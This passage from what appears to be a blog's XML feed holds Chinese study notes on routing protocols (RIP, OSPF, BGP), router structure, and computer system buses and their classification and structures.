routing）</li><li>在自治系统内部的路由选择叫做<strong>域内路由选择</strong>（intradomain routing）</li></ul><h2 id="5-2-内部网关协议-RIP"><a href="#5-2-内部网关协议-RIP" class="headerlink" title="5.2 内部网关协议 RIP"></a>5.2 内部网关协议 RIP</h2><p>路由信息协议 RIP（Routing Information Protocol）是内部网关协议 IGP中最先得到广泛使用的协议。RIP 是一种分布式的基于距离向量的路由选择协议。</p><p>RIP 协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录。&#x20;</p><p>“距离”的定义如下：</p><ul><li><p>从一路由器到直接连接的网络的距离定义为 1。</p></li><li><p>从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1。</p></li><li><p>RIP 协议中的“距离”也称为“跳数”(hop count)，因为每经过一个路由器，跳数就加 1。</p></li><li><p>这里的“距离”实际上指的是“最短距离”，&#x20;</p></li></ul><p>RIP 认为一个好的路由就是它通过的路由器的数目少，即“距离短”。RIP 允许一条路径最多只能包含 15 个路由器。</p><p>“距离”的最大值为16 时即相当于不可达。可见 RIP 只适用于小型互联网。</p><p>RIP 不能在两个网络之间同时使用多条路由。RIP 选择一个具有最少路由器的路由（即最短路由），哪怕还存在另一条高速（低时延）但路由器较多的路由。  &#x20;</p><h3 id="5-2-1-RIP-协议的特点"><a href="#5-2-1-RIP-协议的特点" class="headerlink" title="5.2.1 RIP 协议的特点"></a>5.2.1 RIP 协议的特点</h3><p>和哪些路由器交换信息？交换什么信息？在什么时候交换信息？</p><ol><li><p>仅和相邻路由器交换信息，不相邻的路由器不交换信息。</p></li><li><p>交换的信息是当前本路由器所知道的全部信息，即自己的路由表。&#x20;</p></li><li><p>按固定的时间间隔交换路由信息，例如，每隔 30 秒。&#x20;</p></li></ol><p>路由器在刚刚开始工作时，只知道到直接连接的网络的距离（此距离定义为1）。</p><p>以后，每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。经过若干次更新后，所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。</p><p>RIP 协议的收敛（convergence）过程较快，即在自治系统中所有的结点都得到正确的路由选择信息的过程。&#x20;</p><h3 id="5-2-2-距离向量算法-xD"><a href="#5-2-2-距离向量算法-xD" class="headerlink" title="5.2.2 距离向量算法&#xD;"></a>5.2.2 距离向量算法&#xD;</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_cDxY4IK9ja.png"></p><p>RIP协议让互联网中的所有路由器都和自己的相邻路由器不断交换路由信息，并不断更新其路由表，使得从每一个路由器到每一个目的网络的路由都是最短的（即跳数最少）。</p><p>虽然所有的路由器最终都拥有了整个自治系统的全局路由信息，但由于每一个路由器的位置不同，它们的路由表当然也应当是不同的。 &#x20;</p><h3 id="5-2-3-RIP2-协议的报文格式"><a href="#5-2-3-RIP2-协议的报文格式" class="headerlink" title="5.2.3 RIP2 协议的报文格式"></a>5.2.3 RIP2 协议的报文格式</h3><p>现在较新的RIP版本是1998年11月公布的RIP2，新版本协议本身并无多大变化，但性能上有些改进。</p><p>RIP2可以支持无分类域间路由选择CIDR，并且还提供简单的鉴别过程支持多播。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_eXUGn_msYu.png"></p><p>RIP2 的报文由首部和路由部分组成。</p><p>RIP2 报文中的路由部分由若干个路由信息组成。每个路由信息需要用 20 个字节。地址族标识符（又称为地址类别）字段用来标志所使用的地址协议。</p><p>路由标记填入自治系统的号码，这是考虑使RIP 有可能收到本自治系统以外的路由选择信息。再后面指出某个网络地址、该网络的子网掩码、下一跳路由器地址以及到此网络的距离。 &#x20;</p><h3 id="5-2-4-RIP-协议的优缺点"><a href="#5-2-4-RIP-协议的优缺点" class="headerlink" title="5.2.4 RIP 协议的优缺点"></a>5.2.4 RIP 协议的优缺点</h3><p><strong>优点</strong>：</p><ol><li>RIP 协议最大的优点就是实现简单，开销较小。</li></ol><p><strong>缺点</strong>：</p><ol><li>RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。</li><li>路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。</li><li>RIP 存在的一个问题是当网络出现故障时，要经过比较长的时间才能将此信息传送到所有的路由器。（坏消息传播的慢）</li></ol><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_DNUYyzn4KA.png"></p><h2 id="5-3-内部网关协议-OSPF"><a href="#5-3-内部网关协议-OSPF" class="headerlink" title="5.3 内部网关协议 OSPF"></a>5.3 内部网关协议 OSPF</h2><p>开放最短路径优先OSPF（Open Shortest Path First）最主要的特征就是使用链路状态协议，特点如下：</p><ol><li><p>向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法。</p></li><li><p>发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。“链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。&#x20;</p></li><li><p>只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 &#x20;</p></li></ol><h3 id="5-3-1-链路状态数据库"><a href="#5-3-1-链路状态数据库" class="headerlink" title="5.3.1 链路状态数据库"></a>5.3.1 链路状态数据库</h3><p>由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。这个数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步）。</p><p>OSPF 的链路状态数据库能较快地进行更新，使各个路由器能及时更新其路由表。OSPF 的更新过程收敛得快是其重要优点。</p><p>RIP协议的每一个路由器虽然知道到所有网络的距离以及吓一跳路由器，但不知道全网的拓扑结构。</p><h3 id="5-3-2-区域-area"><a href="#5-3-2-区域-area" class="headerlink" title="5.3.2 区域(area)"></a>5.3.2 区域(area)</h3><p>为了使 OSPF 能够用于规模很大的网络，OSPF 将一个自治系统再划分为若干个更小的范围，叫作区域。</p><p>每一个区域都有一个 32 位的区域标识符（用点分十进制表示）。区域也不能太大，在一个区域内的路由器最好不超过 200 个。 &#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_RVoCNEh8Fw.png"></p><p>划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。</p><p>在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况。</p><p>OSPF 使用层次结构的区域划分。在上层的区域叫作<strong>主干区域</strong>（backbone area）。主干区域的标识符规定为0.0.0.0。主干区域的作用是用来连通其他在下层的区域。 &#x20;</p><p>主干路由器：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_P70EkTQ-Yc.png"></p><p>区域边界路由器：  </p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_ib7cNw-X5P.png"></p><h3 id="5-3-3-OSPF-直接用-IP-数据报传送"><a href="#5-3-3-OSPF-直接用-IP-数据报传送" class="headerlink" title="5.3.3 OSPF 直接用 IP 数据报传送"></a>5.3.3 OSPF 直接用 IP 数据报传送</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_BXkD1O-yAw.png"></p><p>OSPF 不用 UDP 而是直接用 IP 数据报传送。OSPF 构成的数据报很短。这样做可减少路由信息的通信量。</p><p>数据报很短的另一好处是可以不必将长的数据报分片传送。分片传送的数据报只要丢失一个，就无法组装成原来的数据报，而整个数据报就必须重传。&#x20;</p><h3 id="5-3-4-OSPF-的其他特点"><a href="#5-3-4-OSPF-的其他特点" class="headerlink" title="5.3.4 OSPF 的其他特点"></a>5.3.4 OSPF 的其他特点</h3><ol><li><p>OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由。</p></li><li><p>如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫作<strong>多路径间的负载平衡</strong>。</p></li><li><p>所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。</p></li><li><p>支持可变长度的子网划分和无分类编址 CIDR。</p></li><li><p>每一个链路状态都带上一个 32 位的序号，序号越大状态就越新。</p></li></ol><h3 id="5-3-5-OSPF-的五种分组类型"><a href="#5-3-5-OSPF-的五种分组类型" class="headerlink" title="5.3.5 OSPF 的五种分组类型"></a>5.3.5 OSPF 的五种分组类型</h3><ol><li><p>类型1，问候(Hello)分组。</p></li><li><p>类型2，数据库描述(Database Description)分组。</p></li><li><p>类型3，链路状态请求(Link State Request)分组。</p></li><li><p>类型4，链路状态更新(Link State Update)分组，用洪泛法对全网更新链路状态。</p></li><li><p>类型5，链路状态确认(Link State Acknowledgment)分组。&#x20;</p></li></ol><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_66TMCf9wY_.png"></p><p>OSPF 使用的是可靠的洪泛法，在收到更新分组后要发送确认，图中的空心箭头表示确认分组。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_8x3tSrvY7j.png"></p><p>OSPF 还规定每隔一段时间，如 30 分钟，要刷新一次数据库中的链路状态。&#x20;</p><p>由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF 协议要比距离向量协议 RIP 好得多。&#x20;</p><p>OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms。&#x20;</p><h3 id="5-3-6-指定的路由器"><a href="#5-3-6-指定的路由器" class="headerlink" title="5.3.6 指定的路由器"></a>5.3.6 指定的路由器</h3><p>多点接入的局域网采用了指定的路由器的方法，使广播的信息量大大减少。</p><p>指定的路由器代表该局域网上所有的链路向连接到该网络上的各路由器发送状态信息。&#x20;</p><h2 id="5-4-外部网关协议-BGP"><a href="#5-4-外部网关协议-BGP" class="headerlink" title="5.4 外部网关协议 BGP"></a>5.4 外部网关协议 BGP</h2><p>BGP 是不同自治系统的路由器之间交换路由信息的协议。</p><p>因特网的规模太大，使得自治系统之间路由选择非常困难。对于自治系统之间的路由选择，要寻找最佳路由是很不现实的。</p><ul><li><p>当一条路径通过几个不同 AS 时，要想对这样的路径计算出有意义的代价是不太可能的。</p></li><li><p>比较合理的做法是在 AS 之间交换“可达性”信息。  &#x20;</p></li></ul><p>自治系统之间的路由选择必须考虑有关策略。</p><p>因此，边界网关协议 BGP 只能是力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非要寻找一条最佳路由。 &#x20;</p><h3 id="5-4-1-BGP-发言人"><a href="#5-4-1-BGP-发言人" class="headerlink" title="5.4.1 BGP 发言人"></a>5.4.1 BGP 发言人</h3><p>每一个自治系统的管理员要选择至少一个路由器作为该自治系统的“ BGP 发言人” 。</p><p>一般说来，两个 BGP 发言人都是通过一个共享网络连接在一起的，而 BGP 发言人往往就是 BGP 边界路由器，但也可以不是 BGP 边界路由器。&#x20;</p><p>一个 BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，然后在此连接上交换 BGP 报文以建立 BGP 会话(session)，利用 BGP 会话交换路由信息。</p><ul><li>用 TCP 连接能提供可靠的服务，也简化了路由选择协议。</li><li>使用 TCP 连接交换路由信息的两个 BGP 发言人，彼此成为对方的邻站或对等站。</li></ul><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_NkApIf_g6s.png"></p><h3 id="5-4-2-BGP分类"><a href="#5-4-2-BGP分类" class="headerlink" title="5.4.2 BGP分类"></a>5.4.2 BGP分类</h3><ul><li><p><strong>eBGP</strong></p><p>运行与不同AS之间的BGP称为eBGP。为了防止AS间产生环路，当BGP设备接收eBGP对等体发送的路由时，会将带有本地AS号的路由丢弃。</p></li><li><p><strong>iBGP</strong></p><p>AS内部的连接称为iBGP，在一个AS内部所有的iBGP必须是全连通的，即使两个路由器之间没有物理连接，但它们之间仍然有iBGP连接。</p></li></ul><p>因此协议BGP不仅运行在AS之间，还要运行在AS内部。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_kKjcM9DgaE.png"></p><h3 id="5-4-3-BGP-4-的四种报文"><a href="#5-4-3-BGP-4-的四种报文" class="headerlink" title="5.4.3 BGP-4 的四种报文"></a>5.4.3 BGP-4 的四种报文</h3><ol><li><p>打开(OPEN)报文，用来与相邻的另一个BGP发言人建立关系。</p></li><li><p>更新(UPDATE)报文，用来发送某一路由的信息，以及列出要撤消的多条路由。</p></li><li><p>保活(KEEPALIVE)报文，用来确认打开报文和周期性地证实邻站关系。</p></li><li><p>通知(NOTIFICATION)报文，用来发送检测到的差错。</p></li></ol><p>在 RFC 2918 中增加了 ROUTE-REFRESH 报文，用来请求对等端重新通告。&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_MVQqtq73DH.png"></p><hr><h1 id="6-路由器的构成"><a href="#6-路由器的构成" class="headerlink" title="6 路由器的构成"></a>6 路由器的构成</h1><p>路由器是一种具有多个输入端口和多个输出端口的专用计算机，其任务是转发分组。</p><h2 id="6-1-输入端口对线路上收到的分组的处理"><a href="#6-1-输入端口对线路上收到的分组的处理" class="headerlink" title="6.1 输入端口对线路上收到的分组的处理"></a>6.1 输入端口对线路上收到的分组的处理</h2><p>数据链路层剥去帧首部和尾部后，将分组送到网络层的队列中排队等待处理。这会产生一定的时延。&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_HZwMiCi5Pg.png"></p><p>输出端口将交换结构传送来的分组发送到线路&#x20;</p><p>当交换结构传送过来的分组先进行缓存。数据链路层处理模块将分组加上链路层的首部和尾部，交给物理层后发送到外部线路。&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_Bv5DmcvO_5.png"></p><p>若路由器处理分组的速率赶不上分组进入队列的速率，则队列的存储空间最终必定减少到零，这就使后面再进入队列的分组由于没有存储空间而只能被丢弃。</p><p>路由器中的输入或输出队列产生溢出是造成分组丢失的重要原因。 &#x20;</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理第3章：系统总线</title>
      <link href="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/"/>
      <url>/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="1-总线的基本概念"><a href="#1-总线的基本概念" class="headerlink" title="1 总线的基本概念"></a>1 总线的基本概念</h1><p>计算机系统的五大部件之间的互连方式有两种：</p><ol><li>各部件之间使用单独的连线——分散连接</li><li>将各部件连到一组公共信息传输线上——总线连接</li></ol><p><strong>总线</strong>是连接各个部件的信息传输线，是各个部件共享的传输介质，同一时刻，只允许有一个部件向总线发送信息，而多个部件可以同时从总线上接受相同的信息。</p><blockquote><p>这里有点像局域网的广播信道，同一时刻只能由一个主机发送数据，其他只能监听。</p></blockquote><h2 id="1-1-总线结构的计算机举例"><a href="#1-1-总线结构的计算机举例" class="headerlink" title="1.1 总线结构的计算机举例"></a>1.1 总线结构的计算机举例</h2><h3 id="1-1-1-面向-CPU-的双总线结构框图"><a href="#1-1-1-面向-CPU-的双总线结构框图" class="headerlink" title="1.1.1 面向 CPU 的双总线结构框图"></a>1.1.1 面向 CPU 的双总线结构框图</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_sfJGu3nrcm.png"></p><p>这种结构在I&#x2F;O设备与主存交换信息时仍然要占用CPU，因此会影响CPU的工作效率。</p><h3 id="1-1-2-单总线结构框图"><a href="#1-1-2-单总线结构框图" class="headerlink" title="1.1.2 单总线结构框图"></a>1.1.2 单总线结构框图</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_twFb3d3G2Z.png"></p><p>当主存与I&#x2F;O交换信息时，原则上不影响CPU的工作，CPU仍可继续处理不访问主存或I&#x2F;O设备的操作，工作效率有所提升。</p><p>由于只有一组总线，当某一时刻各部件都要占用系统总线时，就会发生冲突。</p><h3 id="1-1-3-以存储器为中心的双总线结构框图"><a href="#1-1-3-以存储器为中心的双总线结构框图" class="headerlink" title="1.1.3 以存储器为中心的双总线结构框图"></a>1.1.3 以存储器为中心的双总线结构框图</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_LfR5QrRh5e.png"></p><p>在单总线基础上又开辟出一条CPU与主存之间的总线，称为存储总线，只供主存与CPU之间传输信息。既提高了传输效率，又减轻了系统总线的负担，还保证了IO设备与存储器交换信息时不经过CPU的特点。</p><hr><h1 id="2-总线的分类"><a href="#2-总线的分类" class="headerlink" title="2 总线的分类"></a>2 总线的分类</h1><h2 id="2-1-片内总线"><a href="#2-1-片内总线" class="headerlink" title="2.1 片内总线"></a>2.1 片内总线</h2><p>片内总线是指芯片内部的总线，如在CPU芯片内部，寄存器与寄存器之间、寄存器与算逻单元ALU之间都由片内总线相连。</p><h2 id="2-2-系统总线"><a href="#2-2-系统总线" class="headerlink" title="2.2 系统总线"></a>2.2 系统总线</h2><p>系统总线是指CPU、主存、IO设备各大部分之间的信息传输线。根据传输信息的不同，可分为３类：数据总线、地址总线和控制总线。</p><h3 id="2-2-1-数据总线"><a href="#2-2-1-数据总线" class="headerlink" title="2.2.1 数据总线"></a>2.2.1 数据总线</h3><p>数据总线用来传输各功能部件之间的数据信息，它是双向传输总线，其位数与机器字长、存储字长有关，一般位8位、16位、32位。</p><p>数据总线的位数称为<strong>数据总线宽度</strong>，通常情况下，数据总线宽度是小于等于机器字长位数。 64位的机器字长，数据总线宽度可以是8位、16位、32位、64位。</p><h3 id="2-2-2-地址总线"><a href="#2-2-2-地址总线" class="headerlink" title="2.2.2 地址总线"></a>2.2.2 地址总线</h3><p><strong>地址总线</strong>主要用来指出数据总线上源数据或目的数据在主存单元的地址或I&#x2F;O设备的地址。</p><p>简单的说就是地址总线用来指明源数据在主存单元中要存入的地址，以及目的数据在I&#x2F;O设备中的地址。例如：</p><ol><li>要从存储器中读取一个数据时，CPU需要将要读取的数据在存储单元中的地址传送到地址总线上，发送给存储单元时，存储单元根据收到的地址信息读取数据。</li><li>要将数据经过I&#x2F;O设备输出时，CPU除了将数据传输到数据总线外，还需要将该设备I&#x2F;O接口的地址传送到地址总线上。这样才能根据地址找到对应的设备从而输出数据。</li></ol><h3 id="2-2-3-控制总线"><a href="#2-2-3-控制总线" class="headerlink" title="2.2.3 控制总线"></a>2.2.3 控制总线</h3><p>控制总线是用来控制各部件在数据总线和地址总线上的实现使用权，用来发出各种控制信号的传输线。控制总线可以是单向的，也可以是双向的。</p><p>常见的控制信号如下：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_1wLkZCpbH1.png"></p><h2 id="2-3-通信总线"><a href="#2-3-通信总线" class="headerlink" title="2.3 通信总线"></a>2.3 通信总线</h2><p>通信总线用于计算机系统之间或计算机系统与其他系统（如控制仪表、移动通信等）之间的通信。按传输方式可以分为两种：<strong>串行通信和并行通信</strong>。</p><h3 id="2-3-1-串行通信"><a href="#2-3-1-串行通信" class="headerlink" title="2.3.1 串行通信"></a>2.3.1 串行通信</h3><p>串行通信指数据在单条1位宽的传输线上，一位一位的按顺序分时发送。 &#x20;</p><p>1字节的信息在串行通信中要分8次从地位到高位按顺序逐次传送。</p><h3 id="2-3-2-并行通信"><a href="#2-3-2-并行通信" class="headerlink" title="2.3.2 并行通信"></a>2.3.2 并行通信</h3><p>并行通信指数据在多条1位宽的传输线上，同时由源传送到目的地。</p><p><strong>并行通信适用于近距离的数据传输，串行通信适用于远距离。 数据传输速率与距离成反比。</strong></p><p>在短距离内，并行数据传送速率比串行数据传送速率高得多。</p><hr><h1 id="3-总线特性及性能指标"><a href="#3-总线特性及性能指标" class="headerlink" title="3 总线特性及性能指标"></a>3 总线特性及性能指标</h1><h2 id="3-1-总线特性"><a href="#3-1-总线特性" class="headerlink" title="3.1 总线特性"></a>3.1 总线特性</h2><p>从物理角度看，总线由许多导线直接印刷在电路板上，延伸到各个部件。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_xAKNNudSc8.png"></p><p>图中CPU、主存、IO这些插板（又称插卡）通过插头与水平方向总线插槽连接。</p><p>总线特性包括机械特性、电气特性、功能特性、时间特性。</p><ol><li><strong>机械特性</strong>：总线在机械连接方式上的一些性能，如尺寸、形状、管脚数及排列顺序；</li><li><strong>电气特性</strong>：总线上的每一根传输线上信号的传输方向和有效的电平范围；</li><li><strong>功能特性</strong>：每根传输线的功能；</li><li><strong>时间特性</strong>：总线中的任一根线在什么时间内有效，信号的时序关系。</li></ol><h2 id="3-2-性能指标"><a href="#3-2-性能指标" class="headerlink" title="3.2 性能指标"></a>3.2 性能指标</h2><p>总线性能指标如下：</p><table><thead><tr><th>指标</th><th>内容</th></tr></thead><tbody><tr><td>总线宽度</td><td>通常是指数据总线的根数，用bit位表示</td></tr><tr><td>总线带宽</td><td>总线的传输速率，单位时间内总线上传输数据的位数，通常用每秒传输信息的字节数来衡量，单位可用MBps</td></tr><tr><td>时钟同步&#x2F;异步</td><td>总线上的数据与时钟同步工作的总线称为同步总线,与时钟不同步工作的总线称为异步总线。</td></tr><tr><td>总线复用</td><td>一条总线在不同时刻可以传输两种信号，就是一条总线可以当几条用。</td></tr><tr><td>信号线数</td><td>地址总线，数据总线、控制总线三种总线数的和</td></tr><tr><td>总线控制方式</td><td>突发工作，自动配置，仲裁方式，逻辑方式，计数方式</td></tr><tr><td>其他指标</td><td>负载能力，电源电压</td></tr></tbody></table><p>总线的负载能力即驱动能力，是指当总线接上负载后，总线输入输出的逻辑电平是否能保持在正常的额定范围内。</p><h2 id="3-3-总线标准"><a href="#3-3-总线标准" class="headerlink" title="3.3 总线标准"></a>3.3 总线标准</h2><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_wZixZZ8Aud.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_P8MjxZ1EAQ.png"></p><hr><h1 id="4-总线结构"><a href="#4-总线结构" class="headerlink" title="4 总线结构"></a>4 总线结构</h1><p>总线结构可分为单总线结构和多总线结构两种。</p><h2 id="4-1-单总线结构"><a href="#4-1-单总线结构" class="headerlink" title="4.1 单总线结构"></a>4.1 单总线结构</h2><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_ce6Tns-bng.png"></p><p>这样的总线结构会严重影响CPU的运行效率，因为当CPU需要与主存进行信息交换时，总线使用权很容易被其他设备占用，并且当设备很多时，总线很长。</p><h2 id="4-2-多总线结构"><a href="#4-2-多总线结构" class="headerlink" title="4.2 多总线结构"></a>4.2 多总线结构</h2><h3 id="4-2-1-双总线结构"><a href="#4-2-1-双总线结构" class="headerlink" title="4.2.1 双总线结构"></a>4.2.1 双总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_RTzj5gUqNN.png"></p><p>如图所示的双总线结构是将总线分为<strong>主存总线和I&#x2F;O总线</strong>。</p><p><strong>通道：</strong> 一种具有特殊功能的CPU，对I&#x2F;O设备具有统一管理的功能，完成外部设备与主存储器之间的数据传送，系统吞吐能力可以相当大。通道有自己的控制器，指令系统，能够执行简单的指令。通道程序通常由操作系统编写，而非人工。</p><h3 id="4-2-2-三总线结构"><a href="#4-2-2-三总线结构" class="headerlink" title="4.2.2 三总线结构"></a>4.2.2 三总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_UUUTT5NeOv.png"></p><ul><li>主存总线用于CPU和主存之间的信息传输。</li><li>I&#x2F;O总线用于CPU与各类I&#x2F;O设备之间传递信息。</li><li>DMA总线用于高速I&#x2F;O设备与主存之间直接信息交换。</li></ul><h3 id="4-2-3-三总线结构的又一形式-xD"><a href="#4-2-3-三总线结构的又一形式-xD" class="headerlink" title="4.2.3 三总线结构的又一形式&#xD;"></a>4.2.3 三总线结构的又一形式&#xD;</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_lSvTHpQSi_.png"></p><p>由于CPU的运行速度通常远大于主存的运行速度，速度差容易导致CPU等待时间过久而降低整体运行效率，所以设置了Cache缓存来解决。&#x20;</p><p>Cache是小容量高速的存储器，传输系统CPU与主存之间的信息。</p><h3 id="4-2-4-四总线结构"><a href="#4-2-4-四总线结构" class="headerlink" title="4.2.4 四总线结构"></a>4.2.4 四总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_KOcLNvUsDM.png"></p><p>又增加了一条与计算机系统紧密相连的高速总线。在高速总线上挂接了一些高速设备。</p><p>它们通过Cache控制机构中的高速总线桥或高速缓冲器与系统总线和局部总线相连，使得这些高速设备与CPU更密切。</p><p>一些低速设备如图文传真FAX、调制解调器等仍然挂在扩展总线上，并由扩展总线接口与高速总线相连。</p><h2 id="4-3-总线结构举例"><a href="#4-3-总线结构举例" 